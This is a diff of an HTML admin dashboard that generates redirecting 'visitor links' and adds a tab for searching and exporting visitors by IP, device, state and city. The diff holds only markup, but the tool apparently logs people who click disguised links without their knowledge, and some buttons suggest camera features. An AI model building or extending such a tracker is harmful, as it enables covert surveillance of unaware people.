@@ -11,38 +11,79 @@
     <div class="admin-container">
         <header>
             <h1>🚀 Admin Dashboard</h1>
-            <button onclick="logout()" class="logout-btn">Logout</button>
+            <div style="display:flex; gap:10px; flex-wrap:wrap;">
+                <button onclick="showTab('dashboard')" class="tab-btn active" id="tabDashboard">Dashboard</button>
+                <button onclick="showTab('users')" class="tab-btn" id="tabUsers">📊 Users Data</button>
+                <button onclick="logout()" class="logout-btn">Logout</button>
+            </div>
         </header>
         
-        <div class="dashboard-stats">
-            <div class="stat-card"><h3>Total Visitors</h3><p id="totalVisitors">0</p></div>
-            <div class="stat-card"><h3>Active Visitors</h3><p id="activeVisitors">0</p></div>
-            <div class="stat-card"><h3>Total Links</h3><p id="totalLinks">0</p></div>
-        </div>
-        
-        <div class="link-generator">
-            <h3>🔗 Generate Visitor Link</h3>
-            <div class="link-input-group">
-                <input type="url" id="customUrl" placeholder="Enter any URL" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
-                <button onclick="generateCustomLink()">Generate Link</button>
+        <!-- Dashboard Tab -->
+        <div id="dashboardTab">
+            <div class="dashboard-stats">
+                <div class="stat-card"><h3>Total Visitors</h3><p id="totalVisitors">0</p></div>
+                <div class="stat-card"><h3>Active Visitors</h3><p id="activeVisitors">0</p></div>
+                <div class="stat-card"><h3>Total Links</h3><p id="totalLinks">0</p></div>
             </div>
-            <div id="generatedLinkContainer" style="display:none;">
-                <p><strong>✅ Visitor Link Ready:</strong></p>
-                <div style="display:flex; gap:10px;">
-                    <input type="text" id="generatedLink" readonly style="flex:1; padding:10px; border:2px solid #48bb78; border-radius:5px; background:#f0fff4;">
-                    <button onclick="copyLink()" style="padding:10px 20px; background:#667eea; color:white; border:none; border-radius:5px; cursor:pointer;">Copy</button>
+            
+            <div class="link-generator">
+                <h3>🔗 Generate Visitor Link</h3>
+                <div class="link-input-group">
+                    <input type="url" id="customUrl" placeholder="Enter any URL" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+                    <button onclick="generateCustomLink()">Generate Link</button>
                 </div>
-                <p style="margin-top:10px; color:#4a5568;">📌 Redirecting to: <span id="redirectUrlDisplay" style="color:#667eea; word-break:break-all;"></span></p>
+                <div id="generatedLinkContainer" style="display:none;">
+                    <p><strong>✅ Visitor Link Ready:</strong></p>
+                    <div style="display:flex; gap:10px;">
+                        <input type="text" id="generatedLink" readonly style="flex:1; padding:10px; border:2px solid #48bb78; border-radius:5px; background:#f0fff4;">
+                        <button onclick="copyLink()" style="padding:10px 20px; background:#667eea; color:white; border:none; border-radius:5px; cursor:pointer;">Copy</button>
+                    </div>
+                    <p style="margin-top:10px; color:#4a5568;">📌 Redirecting to: <span id="redirectUrlDisplay" style="color:#667eea; word-break:break-all;"></span></p>
+                </div>
+            </div>
+            
+            <div class="visitors-table">
+                <h2>👥 Recent Visitors</h2>
+                <div id="visitorsList"></div>
             </div>
         </div>
         
-        <div class="visitors-table">
-            <h2>👥 Visitors Management</h2>
-            <div id="visitorsList"></div>
+        <!-- Users Data Tab -->
+        <div id="usersTab" style="display:none;">
+            <!-- Stats -->
+            <div class="dashboard-stats" id="usersStats">
+                <div class="stat-card"><h3>👥 Total Users</h3><p id="totalUsers">0</p></div>
+                <div class="stat-card"><h3>🔄 Total Visits</h3><p id="totalVisitsAll">0</p></div>
+                <div class="stat-card"><h3>📍 Unique Locations</h3><p id="uniqueLocations">0</p></div>
+                <div class="stat-card"><h3>📱 Active Now</h3><p id="activeNow">0</p></div>
+            </div>
+            
+            <!-- Search & Filters -->
+            <div class="link-generator">
+                <h3>🔍 Search Users</h3>
+                <div style="display:flex; gap:10px; flex-wrap:wrap;">
+                    <input type="text" id="searchUsers" placeholder="Search by ID, Device, State, City, IP..." onkeyup="searchUsers()" style="flex:1; padding:12px; border:2px solid #ddd; border-radius:5px; min-width:200px;">
+                    <select id="filterState" onchange="searchUsers()" style="padding:12px; border:2px solid #ddd; border-radius:5px;">
+                        <option value="">All States</option>
+                    </select>
+                    <button onclick="clearFilters()" class="camera-btn" style="background:#ed8936;">Clear Filters</button>
+                    <button onclick="exportAllData()" class="camera-btn" style="background:#48bb78;">📥 Export All</button>
+                </div>
+            </div>
+            
+            <!-- Users List -->
+            <div class="visitors-table">
+                <h2>📊 All Users Data <span id="userCount" style="font-size:14px; color:#888; font-weight:normal;"></span></h2>
+                <div id="allUsersList"></div>
+            </div>
         </div>
         
+        <!-- Visitor Details -->
         <div class="visitor-details" id="visitorDetails" style="display:none;">
-            <h2>📊 Visitor Details</h2>
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <h2>📊 Visitor Details</h2>
+                <button onclick="document.getElementById('visitorDetails').style.display='none'" class="camera-btn delete">✕ Close</button>
+            </div>
             <div id="detailsContent"></div>
         </div>
     </div>
